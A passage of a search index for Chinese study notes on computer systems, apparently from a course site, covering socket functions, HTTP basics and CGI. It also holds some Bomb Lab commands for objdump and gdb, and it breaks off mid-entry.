\u200b\u800c\u200b\u4e0d\u662f\u200b\u50cf\u200b\u5ba2\u6237\u7aef\u200b\u4e00\u6837\u200b\u7531\u200b\u5185\u6838\u200b\u968f\u673a\u200b\u51b3\u5b9a\u200b.</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1145-listen","title":"11.4.5 listen \u200b\u51fd\u6570","text":"<p>\u200b\u5ba2\u6237\u7aef\u200b\u662f\u200b\u53d1\u8d77\u200b\u8fde\u63a5\u200b\u8bf7\u6c42\u200b\u7684\u200b\u4e3b\u52a8\u200b\u5b9e\u4f53\u200b, \u200b\u670d\u52a1\u5668\u200b\u662f\u200b\u7b49\u5f85\u200b\u6765\u81ea\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u8fde\u63a5\u200b\u8bf7\u6c42\u200b\u7684\u200b\u88ab\u52a8\u200b\u5b9e\u4f53\u200b. \u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b, \u200b\u5185\u6838\u200b\u4f1a\u200b\u8ba4\u4e3a\u200b <code>socket</code> \u200b\u51fd\u6570\u200b\u521b\u5efa\u200b\u7684\u200b\u63cf\u8ff0\u7b26\u200b\u5bf9\u5e94\u200b\u4e8e\u200b\u4e3b\u52a8\u200b\u5957\u200b\u63a5\u5b57\u200b. \u200b\u670d\u52a1\u5668\u200b\u8c03\u7528\u200b <code>listen</code> \u200b\u51fd\u6570\u200b\u544a\u8bc9\u200b\u5185\u6838\u200b, \u200b\u63cf\u8ff0\u7b26\u200b\u662f\u200b\u88ab\u200b\u670d\u52a1\u5668\u200b\u800c\u200b\u4e0d\u662f\u200b\u5ba2\u6237\u7aef\u200b\u4f7f\u7528\u200b\u7684\u200b.</p> <p></p> <p><code>listen</code> \u200b\u51fd\u6570\u200b\u5c06\u200b <code>sockfd</code> \u200b\u4ece\u200b\u4e00\u4e2a\u200b\u4e3b\u52a8\u200b\u5957\u200b\u63a5\u5b57\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u76d1\u542c\u200b\u5957\u200b\u63a5\u5b57\u200b, \u200b\u8be5\u5957\u200b\u63a5\u5b57\u200b\u53ef\u4ee5\u200b\u63a5\u53d7\u200b\u6765\u81ea\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u8fde\u63a5\u200b\u8bf7\u6c42\u200b. <code>backlog</code> \u200b\u53c2\u6570\u200b\u6697\u793a\u200b\u4e86\u200b\u5185\u6838\u200b\u5728\u200b\u5f00\u59cb\u200b\u62d2\u7edd\u200b\u8fde\u63a5\u200b\u8bf7\u6c42\u200b\u4e4b\u524d\u200b, \u200b\u961f\u5217\u200b\u4e2d\u8981\u200b\u6392\u961f\u200b\u7684\u200b\u672a\u200b\u5b8c\u6210\u200b\u7684\u200b\u8fde\u63a5\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u91cf\u200b. \u200b\u5176\u200b\u786e\u5207\u200b\u542b\u4e49\u200b\u8981\u6c42\u200b\u5bf9\u200b TCP/IP \u200b\u534f\u8bae\u200b\u7684\u200b\u7406\u89e3\u200b, \u200b\u901a\u5e38\u200b\u4f1a\u200b\u5c06\u200b\u5b83\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u8f83\u5927\u200b\u503c\u200b, \u200b\u5982\u200b <code>1024</code>.</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1146-accept","title":"11.4.6 accept \u200b\u51fd\u6570","text":"<p>\u200b\u670d\u52a1\u5668\u200b\u901a\u8fc7\u200b\u8c03\u7528\u200b <code>accept</code> \u200b\u6765\u200b\u7b49\u5f85\u200b\u6765\u81ea\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u8fde\u63a5\u200b\u8bf7\u6c42\u200b.</p> <p></p> <p><code>accept</code> \u200b\u51fd\u6570\u200b\u7b49\u5f85\u200b\u6765\u81ea\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u8fde\u63a5\u200b\u8bf7\u6c42\u200b\u5230\u8fbe\u200b <code>listenfd</code>, \u200b\u7136\u540e\u200b\u518d\u200b <code>addr</code> \u200b\u4e2d\u200b\u586b\u5199\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b, \u200b\u5e76\u200b\u8fd4\u56de\u200b\u4e00\u4e2a\u200b\u5df2\u200b\u8fde\u63a5\u200b\u63cf\u8ff0\u7b26\u200b. \u200b\u8fd9\u4e2a\u200b\u63cf\u8ff0\u7b26\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u7528\u6765\u200b\u5229\u7528\u200b Unix I/O \u200b\u51fd\u6570\u200b\u4e0e\u200b\u5ba2\u6237\u7aef\u200b\u901a\u4fe1\u200b.</p> \u200b\u533a\u522b\u200b\u70b9\u200b \u200b\u76d1\u542c\u200b\u63cf\u8ff0\u7b26\u200b (Listening) \u200b\u5df2\u200b\u8fde\u63a5\u200b\u63cf\u8ff0\u7b26\u200b (Connected) \u200b\u76ee\u7684\u200b \u200b\u63a5\u53d7\u200b\u65b0\u200b\u7684\u200b TCP \u200b\u8fde\u63a5\u200b\u8bf7\u6c42\u200b\u3002 \u200b\u4f20\u8f93\u200b\u5e94\u7528\u200b\u6570\u636e\u200b\u3002 \u200b\u751f\u547d\u5468\u671f\u200b \u200b\u670d\u52a1\u5668\u200b\u542f\u52a8\u200b\u5230\u200b\u5173\u95ed\u200b\u3002 TCP \u200b\u8fde\u63a5\u200b\u5efa\u7acb\u200b\u5230\u200b\u8fde\u63a5\u200b\u7ec8\u6b62\u200b\u3002 \u200b\u521b\u5efa\u8005\u200b \u200b\u7531\u200b <code>listen()</code> \u200b\u51fd\u6570\u200b\u8bbe\u7f6e\u200b\u3002 \u200b\u7531\u200b <code>accept()</code> \u200b\u51fd\u6570\u200b\u8fd4\u56de\u200b\u3002 \u200b\u8fde\u63a5\u200b\u72b6\u6001\u200b <code>LISTEN</code> (\u200b\u88ab\u52a8\u200b\u7b49\u5f85\u200b)\u3002 <code>ESTABLISHED</code> (\u200b\u53cc\u5411\u200b\u53ef\u200b\u901a\u4fe1\u200b)\u3002 \u200b\u6570\u91cf\u200b\u5173\u7cfb\u200b \u200b\u6bcf\u4e2a\u200b\u7aef\u53e3\u200b 1 \u200b\u4e2a\u200b\u3002 \u200b\u6bcf\u4e2a\u200b\u5ba2\u6237\u7aef\u200b\u8fde\u63a5\u200b 1 \u200b\u4e2a\u200b\u3002"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1147","title":"11.4.7 \u200b\u4e3b\u673a\u200b\u548c\u200b\u670d\u52a1\u200b\u7684\u200b\u8f6c\u6362","text":"<p>Linux \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5f3a\u5927\u200b\u7684\u200b\u51fd\u6570\u200b\u5b9e\u73b0\u200b\u4e8c\u8fdb\u5236\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u7ed3\u6784\u200b\u548c\u200b\u4e3b\u673a\u540d\u200b, \u200b\u4e3b\u673a\u200b\u5730\u5740\u200b, \u200b\u670d\u52a1\u200b\u540d\u200b\u548c\u200b\u7aef\u53e3\u53f7\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b\u8868\u793a\u200b\u4e4b\u95f4\u200b\u7684\u200b\u76f8\u4e92\u200b\u8f6c\u5316\u200b. \u200b\u5f53\u548c\u5957\u200b\u63a5\u5b57\u200b\u63a5\u53e3\u200b\u4e00\u8d77\u200b\u4f7f\u7528\u200b\u65f6\u200b, \u200b\u8fd9\u4e9b\u200b\u51fd\u6570\u200b\u80fd\u200b\u4f7f\u200b\u6211\u4eec\u200b\u7f16\u5199\u200b\u72ec\u7acb\u200b\u4e8e\u200b\u4efb\u4f55\u200b\u7279\u5b9a\u200b\u7248\u672c\u200b\u7684\u200b IP \u200b\u534f\u8bae\u200b\u7684\u200b\u7f51\u7edc\u200b\u7a0b\u5e8f\u200b.</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1-getaddrinfo","title":"1. getaddrinfo \u200b\u51fd\u6570","text":"<p><code>getaddrinfo</code> \u200b\u51fd\u6570\u200b\u5c06\u200b\u4e3b\u673a\u540d\u200b, \u200b\u4e3b\u673a\u200b\u5730\u5740\u200b, \u200b\u670d\u52a1\u200b\u540d\u200b\u548c\u200b\u7aef\u53e3\u53f7\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b\u8868\u793a\u200b\u8f6c\u5316\u200b\u6210\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u7ed3\u6784\u200b. \u200b\u5b83\u200b\u662f\u200b\u5df2\u5f03\u200b\u7528\u200b\u7684\u200b <code>gethostbyname</code> \u200b\u548c\u200b <code>getservbyname</code> \u200b\u51fd\u6570\u200b\u7684\u200b\u66ff\u4ee3\u54c1\u200b, \u200b\u5b83\u200b\u548c\u200b\u4ee5\u524d\u200b\u7684\u200b\u51fd\u6570\u200b\u4e0d\u540c\u200b, \u200b\u5b83\u200b\u662f\u200b\u53ef\u200b\u91cd\u5165\u200b\u7684\u200b, \u200b\u9002\u7528\u200b\u4e8e\u200b\u4efb\u4f55\u200b\u534f\u8bae\u200b.</p> <p></p> <p>\u200b\u7ed9\u5b9a\u200b host \u200b\u548c\u200b service (\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u7684\u200b\u4e24\u4e2a\u200b\u7ec4\u6210\u90e8\u5206\u200b), <code>getaddrinfo</code> \u200b\u8fd4\u56de\u200b <code>result</code> , <code>result</code> \u200b\u662f\u200b\u4e00\u4e2a\u200b\u6307\u5411\u200b <code>addrinfo</code> \u200b\u7ed3\u6784\u200b\u7684\u200b\u94fe\u8868\u200b, \u200b\u5176\u4e2d\u200b\u6bcf\u4e2a\u200b\u7ed3\u6784\u200b\u6307\u5411\u200b\u4e00\u4e2a\u200b\u5bf9\u5e94\u200b\u4e8e\u200b host \u200b\u548c\u200b service \u200b\u7684\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u7ed3\u6784\u200b. (\u200b\u6ce8\u610f\u200b\u4e00\u4e2a\u200b\u4e3b\u673a\u540d\u200b\u53ef\u80fd\u200b\u5bf9\u5e94\u200b\u5f88\u591a\u200b\u4e2a\u200b IP \u200b\u5730\u5740\u200b)</p> <p></p> <p>\u200b\u5ba2\u6237\u7aef\u200b\u8c03\u7528\u200b\u4e86\u200b <code>getaddrinfo</code> \u200b\u540e\u200b, \u200b\u4f1a\u200b\u904d\u5386\u200b\u8fd9\u4e2a\u200b\u5217\u8868\u200b, \u200b\u4f9d\u6b21\u200b\u5c1d\u8bd5\u200b\u6bcf\u4e2a\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b, \u200b\u76f4\u5230\u200b\u8c03\u7528\u200b <code>socket</code> \u200b\u548c\u200b <code>connect</code> \u200b\u6210\u529f\u200b, \u200b\u5efa\u7acb\u200b\u8d77\u200b\u8fde\u63a5\u200b. \u200b\u7c7b\u4f3c\u200b\u5730\u200b, \u200b\u670d\u52a1\u5668\u200b\u4f1a\u200b\u904d\u5386\u200b\u8fd9\u4e2a\u200b\u5217\u8868\u200b\u4e2d\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b, \u200b\u76f4\u5230\u200b\u8c03\u7528\u200b <code>socket</code> \u200b\u548c\u200b <code>bind</code> \u200b\u6210\u529f\u200b. \u200b\u63cf\u8ff0\u7b26\u200b\u4f1a\u200b\u88ab\u200b\u7ed1\u5b9a\u200b\u5230\u200b\u4e00\u4e2a\u200b\u5408\u6cd5\u200b\u7684\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b. \u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u5185\u5b58\u200b\u6cc4\u6f0f\u200b, \u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u5fc5\u987b\u200b\u5728\u200b\u6700\u540e\u200b\u8c03\u7528\u200b <code>freeaddrinfo</code> \u200b\u91ca\u653e\u200b\u8be5\u200b\u94fe\u8868\u200b. \u200b\u5982\u679c\u200b <code>getaddrinfo</code> \u200b\u8fd4\u56de\u200b\u975e\u96f6\u200b\u7684\u200b\u9519\u8bef\u4ee3\u7801\u200b, <code>gai_strerror</code> \u200b\u53ef\u4ee5\u200b\u5c06\u200b\u8be5\u200b\u4ee3\u7801\u200b\u8f6c\u6362\u6210\u200b\u6d88\u606f\u200b\u5b57\u7b26\u4e32\u200b.</p> <p> </p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#2-getnameinfo","title":"2. getnameinfo \u200b\u51fd\u6570","text":"<p><code>getnameinfo</code> \u200b\u51fd\u6570\u200b\u548c\u200b <code>getaddrinfo</code> \u200b\u662f\u200b\u76f8\u53cd\u200b\u7684\u200b, \u200b\u5c06\u200b\u4e00\u4e2a\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u7ed3\u6784\u200b\u8f6c\u6362\u6210\u200b\u76f8\u5e94\u200b\u7684\u200b\u4e3b\u673a\u200b\u548c\u200b\u670d\u52a1\u200b\u540d\u200b\u5b57\u7b26\u4e32\u200b. \u200b\u5b83\u200b\u662f\u200b\u5df2\u5f03\u200b\u7528\u200b\u7684\u200b <code>gethostbyaddr</code> \u200b\u548c\u200b <code>getservbyaddr</code> \u200b\u51fd\u6570\u200b\u7684\u200b\u66ff\u4ee3\u54c1\u200b, \u200b\u5b83\u200b\u548c\u200b\u4ee5\u524d\u200b\u7684\u200b\u51fd\u6570\u200b\u4e0d\u540c\u200b, \u200b\u5b83\u200b\u662f\u200b\u53ef\u200b\u91cd\u5165\u200b\u7684\u200b, \u200b\u9002\u7528\u200b\u4e8e\u200b\u4efb\u4f55\u200b\u534f\u8bae\u200b.</p> <p></p> <p></p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1148","title":"11.4.8 \u200b\u5957\u200b\u63a5\u5b57\u200b\u63a5\u53e3\u200b\u7684\u200b\u8f85\u52a9\u200b\u51fd\u6570","text":"<p>\u200b\u7528\u200b\u9ad8\u7ea7\u200b\u7684\u200b\u8f85\u52a9\u200b\u51fd\u6570\u200b\u5305\u88c5\u200b\u4e00\u4e0b\u200b\u76f8\u5173\u200b\u51fd\u6570\u200b\u4f1a\u200b\u65b9\u4fbf\u200b\u5f88\u591a\u200b.</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1-open_clientfd","title":"1. open_clientfd \u200b\u51fd\u6570","text":"<p>\u200b\u5ba2\u6237\u7aef\u200b\u8c03\u7528\u200b <code>open_clientfd</code> \u200b\u5efa\u7acb\u200b\u4e0e\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u8fde\u63a5\u200b.</p> <p></p> <p> </p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#2-open_listenfd","title":"2. open_listenfd \u200b\u51fd\u6570","text":"<p>\u200b\u8c03\u7528\u200b <code>open_listfd</code> \u200b\u51fd\u6570\u200b, \u200b\u670d\u52a1\u5668\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u76d1\u542c\u200b\u63cf\u8ff0\u7b26\u200b, \u200b\u51c6\u5907\u200b\u597d\u200b\u63a5\u6536\u200b\u8fde\u63a5\u200b\u8bf7\u6c42\u200b. </p> <p></p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1149-echo","title":"11.4.9 echo \u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u793a\u4f8b","text":"<p>\u200b\u89c1\u200b\u6559\u6750\u200b</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#115-web","title":"11.5 Web \u200b\u670d\u52a1\u5668","text":""},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1151-web","title":"11.5.1 Web \u200b\u57fa\u7840","text":""},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1152-web","title":"11.5.2 Web \u200b\u5185\u5bb9","text":"<p>Web \u200b\u670d\u52a1\u5668\u200b\u4ee5\u200b\u4e24\u79cd\u200b\u4e0d\u540c\u200b\u7684\u200b\u65b9\u5f0f\u200b\u5411\u200b\u5ba2\u6237\u7aef\u200b\u63d0\u4f9b\u200b\u5185\u5bb9\u200b:</p> <ul> <li>\u200b\u53d6\u200b\u4e00\u4e2a\u200b\u78c1\u76d8\u200b\u6587\u4ef6\u200b, \u200b\u5e76\u200b\u5c06\u200b\u5b83\u200b\u7684\u200b\u5185\u5bb9\u200b\u8fd4\u56de\u200b\u7ed9\u200b\u5ba2\u6237\u7aef\u200b. \u200b\u78c1\u76d8\u200b\u6587\u4ef6\u200b\u79f0\u4e3a\u200b\u9759\u6001\u200b\u5185\u5bb9\u200b, \u200b\u8fd4\u56de\u200b\u6587\u4ef6\u200b\u7ed9\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u79f0\u4e3a\u200b\u670d\u52a1\u200b\u9759\u6001\u200b\u5185\u5bb9\u200b</li> <li>\u200b\u8fd0\u884c\u200b\u4e00\u4e2a\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b, \u200b\u5e76\u200b\u5c06\u200b\u5b83\u200b\u7684\u200b\u8f93\u51fa\u200b\u8fd4\u56de\u200b\u7ed9\u200b\u5ba2\u6237\u7aef\u200b. \u200b\u8fd0\u884c\u200b\u65f6\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u4ea7\u751f\u200b\u7684\u200b\u8f93\u51fa\u200b\u79f0\u4e3a\u200b\u52a8\u6001\u200b\u5185\u5bb9\u200b, \u200b\u800c\u200b\u8fd0\u884c\u200b\u7a0b\u5e8f\u200b\u5e76\u200b\u8fd4\u56de\u200b\u5b83\u200b\u7684\u200b\u8f93\u51fa\u200b\u5230\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u79f0\u4e3a\u200b\u670d\u52a1\u200b\u52a8\u6001\u200b\u5185\u5bb9\u200b.</li> </ul> <p>\u200b\u6bcf\u6761\u200b\u7531\u200b Web \u200b\u670d\u52a1\u5668\u8fd4\u56de\u200b\u7684\u200b\u5185\u5bb9\u200b\u90fd\u200b\u662f\u200b\u548c\u200b\u5b83\u200b\u7ba1\u7406\u200b\u7684\u200b\u67d0\u4e2a\u200b\u6587\u4ef6\u200b\u76f8\u5173\u8054\u200b\u7684\u200b. \u200b\u8fd9\u4e9b\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u552f\u4e00\u200b\u7684\u200b\u540d\u5b57\u200b, \u200b\u53eb\u505a\u200b URL (Universal Resource Locator, \u200b\u901a\u7528\u200b\u8d44\u6e90\u200b\u5b9a\u4f4d\u200b\u7b26\u200b).  </p> <ul> <li>\u200b\u786e\u5b9a\u200b\u4e00\u4e2a\u200b URL \u200b\u6307\u5411\u200b\u7684\u200b\u662f\u200b\u9759\u6001\u200b\u5185\u5bb9\u200b\u8fd8\u662f\u200b\u52a8\u6001\u200b\u5185\u5bb9\u200b\u6ca1\u6709\u200b\u6807\u51c6\u200b\u7684\u200b\u89c4\u5219\u200b. \u200b\u4e00\u79cd\u200b\u7ecf\u5178\u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b\u786e\u5b9a\u200b\u4e00\u7ec4\u200b\u76ee\u5f55\u200b, \u200b\u6240\u6709\u200b\u7684\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\u90fd\u200b\u5b58\u653e\u200b\u5728\u200b\u8fd9\u4e9b\u200b\u76ee\u5f55\u200b\u4e2d\u200b.</li> <li>\u200b\u540e\u7f00\u200b\u4e2d\u200b\u6700\u200b\u5f00\u59cb\u200b\u7684\u200b '/' \u200b\u8868\u793a\u200b\u7684\u200b\u662f\u200b\u88ab\u200b\u8bf7\u6c42\u200b\u5185\u5bb9\u200b\u7c7b\u578b\u200b\u7684\u200b\u4e3b\u76ee\u5f55\u200b.</li> <li>\u200b\u6700\u5c0f\u200b\u7684\u200b URL \u200b\u540e\u7f00\u200b\u662f\u200b '/' \u200b\u5b57\u7b26\u200b, \u200b\u6240\u6709\u200b\u670d\u52a1\u5668\u200b\u5c06\u200b\u5176\u200b\u6269\u5c55\u200b\u4e3a\u200b\u67d0\u4e2a\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u4e3b\u9875\u200b, \u200b\u4f8b\u5982\u200b /index.html. \u200b\u8fd9\u200b\u89e3\u91ca\u200b\u4e86\u200b\u4e3a\u4ec0\u4e48\u200b\u7b80\u5355\u200b\u5730\u200b\u5728\u200b\u6d4f\u89c8\u5668\u200b\u952e\u5165\u200b\u4e00\u4e2a\u200b\u57df\u540d\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u53d6\u51fa\u200b\u4e00\u4e2a\u200b\u7f51\u7ad9\u200b\u7684\u200b\u4e3b\u9875\u200b. \u200b\u6d4f\u89c8\u5668\u200b\u5728\u200b URL \u200b\u540e\u200b\u6dfb\u52a0\u200b\u7f3a\u5931\u200b\u7684\u200b '/', \u200b\u5e76\u200b\u4f20\u9012\u200b\u7ed9\u200b\u670d\u52a1\u5668\u200b, \u200b\u670d\u52a1\u5668\u200b\u53c8\u200b\u628a\u200b '/' \u200b\u6269\u5c55\u200b\u5230\u200b\u67d0\u4e2a\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u6587\u4ef6\u540d\u200b.</li> </ul>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1153-http","title":"11.5.3 HTTP \u200b\u4e8b\u52a1","text":"<p>\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Linux \u200b\u7684\u200b TELNET \u200b\u7a0b\u5e8f\u200b\u6765\u200b\u548c\u200b\u56e0\u7279\u7f51\u200b\u4e0a\u200b\u7684\u200b\u4efb\u4f55\u200b Web \u200b\u670d\u52a1\u5668\u200b\u6267\u884c\u200b\u4e8b\u52a1\u200b.</p> <p></p> <p>\u200b\u6bcf\u6b21\u200b\u8f93\u5165\u200b\u4e00\u4e2a\u200b\u6587\u672c\u200b\u884c\u200b, \u200b\u5e76\u200b\u952e\u5165\u200b\u56de\u8f66\u952e\u200b, TELNET \u200b\u4f1a\u200b\u8bfb\u53d6\u200b\u8be5\u884c\u200b, \u200b\u5728\u200b\u540e\u9762\u200b\u52a0\u4e0a\u200b\u56de\u8f66\u200b\u548c\u200b\u6362\u884c\u7b26\u200b\u53f7\u200b(\\r\\n) \u200b\u5e76\u4e14\u200b\u5c06\u200b\u8fd9\u200b\u4e00\u884c\u200b\u53d1\u9001\u5230\u200b\u670d\u52a1\u5668\u200b. HTTP \u200b\u6807\u51c6\u200b\u8981\u6c42\u200b\u6bcf\u4e2a\u200b\u6587\u672c\u200b\u884c\u90fd\u200b\u7531\u200b\u4e00\u5bf9\u200b\u56de\u8f66\u200b\u548c\u200b\u6362\u884c\u7b26\u200b\u6765\u200b\u7ed3\u675f\u200b. \u200b\u4e3a\u4e86\u200b\u53d1\u8d77\u200b\u4e8b\u52a1\u200b, \u200b\u6211\u4eec\u200b\u8f93\u5165\u200b\u4e00\u4e2a\u200b HTTP \u200b\u8bf7\u6c42\u200b, \u200b\u670d\u52a1\u5668\u8fd4\u56de\u200b HTTP \u200b\u54cd\u5e94\u200b, \u200b\u7136\u540e\u200b\u5173\u95ed\u200b\u8fde\u63a5\u200b.</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1-http","title":"1. HTTP \u200b\u8bf7\u6c42","text":"<p>\u200b\u4e00\u4e2a\u200b HTTP \u200b\u8bf7\u6c42\u200b\u7531\u200b\u4e00\u4e2a\u200b\u8bf7\u6c42\u200b\u884c\u200b (Line5) \u200b\u540e\u9762\u200b\u8ddf\u968f\u200b\u96f6\u4e2a\u200b\u6216\u200b\u66f4\u200b\u591a\u4e2a\u200b\u8bf7\u6c42\u200b\u62a5\u5934\u200b (Line6), \u200b\u518d\u200b\u8ddf\u968f\u200b\u4e00\u4e2a\u200b\u7a7a\u200b\u7684\u200b\u6587\u672c\u200b\u884c\u6765\u200b\u7ec8\u6b62\u200b\u62a5\u5934\u200b\u5217\u8868\u200b (Line7), \u200b\u4e00\u4e2a\u200b\u8bf7\u6c42\u200b\u884c\u200b\u7684\u200b\u5f62\u5f0f\u200b\u662f\u200b</p> Text Only<pre><code>method URI version\n</code></pre> <p>HTTP \u200b\u652f\u6301\u200b\u8bb8\u591a\u200b\u4e0d\u540c\u200b\u7684\u200b\u65b9\u6cd5\u200b, \u200b\u5305\u62ec\u200b GET, POST, OPTIONS \u200b\u7b49\u7b49\u200b. \u200b\u6211\u4eec\u200b\u53ea\u200b\u8ba8\u8bba\u200b\u5e7f\u4e3a\u200b\u5e94\u7528\u200b\u7684\u200b GET \u200b\u65b9\u6cd5\u200b.</p> <p>GET \u200b\u65b9\u6cd5\u200b\u6307\u5bfc\u200b\u670d\u52a1\u5668\u200b\u751f\u6210\u200b\u548c\u200b\u8fd4\u56de\u200b URI \u200b\u6807\u8bc6\u200b\u7684\u200b\u5185\u5bb9\u200b. URI \u200b\u662f\u200b\u76f8\u5e94\u200b URL \u200b\u7684\u200b\u540e\u7f00\u200b, \u200b\u5305\u62ec\u200b\u6587\u4ef6\u540d\u200b\u548c\u200b\u53ef\u9009\u200b\u53c2\u6570\u200b.</p> <p>\u200b\u8bf7\u6c42\u200b\u62a5\u5934\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u989d\u5916\u200b\u7684\u200b\u4fe1\u606f\u200b.</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#2-http","title":"2. HTTP \u200b\u54cd\u5e94","text":"<p>HTTP \u200b\u54cd\u5e94\u200b\u7531\u200b\u4e00\u4e2a\u200b\u54cd\u5e94\u200b\u884c\u200b (Line8) \u200b\u540e\u9762\u200b\u8ddf\u200b\u968f\u7740\u200b\u96f6\u4e2a\u200b\u6216\u200b\u66f4\u200b\u591a\u4e2a\u200b\u54cd\u5e94\u200b\u62a5\u5934\u200b, \u200b\u518d\u200b\u8ddf\u968f\u200b\u4e00\u4e2a\u200b\u7a7a\u884c\u200b, \u200b\u7136\u540e\u200b\u662f\u200b\u54cd\u5e94\u200b\u4e3b\u4f53\u200b. \u200b\u54cd\u5e94\u200b\u884c\u200b\u7684\u200b\u683c\u5f0f\u200b\u662f\u200b</p> Text Only<pre><code>version status-code status-message\n</code></pre> <p>\u200b\u72b6\u6001\u200b\u7801\u662f\u200b\u4e00\u4e2a\u200b 3 \u200b\u4f4d\u200b\u7684\u200b\u6b63\u6574\u6570\u200b, \u200b\u6307\u660e\u200b\u5bf9\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5904\u7406\u200b.</p> <p></p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1154","title":"11.5.4 \u200b\u670d\u52a1\u200b\u52a8\u6001\u200b\u5185\u5bb9","text":"<p>CGI (Common Gateway Interface, \u200b\u901a\u7528\u200b\u7f51\u5173\u200b\u63a5\u53e3\u200b) \u200b\u7684\u200b\u5b9e\u9645\u200b\u6807\u51c6\u200b\u51fa\u73b0\u200b\u89e3\u51b3\u200b\u4e86\u200b\u670d\u52a1\u200b\u52a8\u6001\u200b\u5185\u5bb9\u200b\u7684\u200b\u95ee\u9898\u200b.</p> <p></p> <p></p> <p> </p> <p></p>"},{"location":"notes/ICS/Lab/","title":"Lab","text":""},{"location":"notes/ICS/Lab/#data-lab","title":"Data Lab","text":"<p>See datalab.ppt</p>"},{"location":"notes/ICS/Lab/#bomb-lab","title":"Bomb Lab","text":""},{"location":"notes/ICS/Lab/#1","title":"1. \u200b\u5e38\u7528\u547d\u4ee4","text":"Bash<pre><code>&gt; tar -xvf bombk.tar \u200b\u89e3\u538b\u200b\u6587\u4ef6\u200b\n&gt; chmod +x bomb \u200b\u8bbe\u7f6e\u200b\u53ef\u200b\u6267\u884c\u200b\u4f4d\u200b (\u200b\u5bf9\u5e94\u200b\u516b\u8fdb\u5236\u200b\u6700\u4f4e\u200b\u6709\u6548\u200b\u4f4d\u200b001)\n&gt; ./bomb \u200b\u8fd0\u884c\u200b\u70b8\u5f39\u200b\n&gt; ./bomb psol.txt \u200b\u5c06\u200b psol.txt \u200b\u7684\u200b\u5185\u5bb9\u200b\u4f5c\u4e3a\u200b\u8f93\u5165\u200b\n&gt; objdump -t \u200b\u6253\u5370\u6587\u4ef6\u200b\u7684\u200b symbol tabel\n&gt; objdump -d \u200b\u53cd\u6c47\u7f16\u200b\u6587\u4ef6\u200b\n&gt; strings \u200b\u6253\u5370\u200b printable strings\n</code></pre>"},{"location":"notes/ICS/Lab/#2-gdb","title":"2. gdb \u200b\u547d\u4ee4","text":"<p>(\u200b\u76f4\u63a5\u200b\u56de\u8f66\u200b\u4f1a\u200b\u91cd\u590d\u200b\u6267\u884c\u200b\u4e0a\u200b\u4e00\u6761\u200b\u547d\u4ee4\u200b)</p> <p>\u200b\u542f\u52a8\u200b <code>gdb bomb</code> \u200b\u4e4b\u540e\u200b, \u200b\u4e00\u822c\u200b\u5148\u200b\u7528\u200b <code>layout asm, layout regs</code> \u200b\u5f00\u542f\u200b\u89c6\u56fe\u200b\u65b9\u4fbf\u200b\u5206\u6790\u200b</p> <p>\u200b\u7528\u200b<code>b 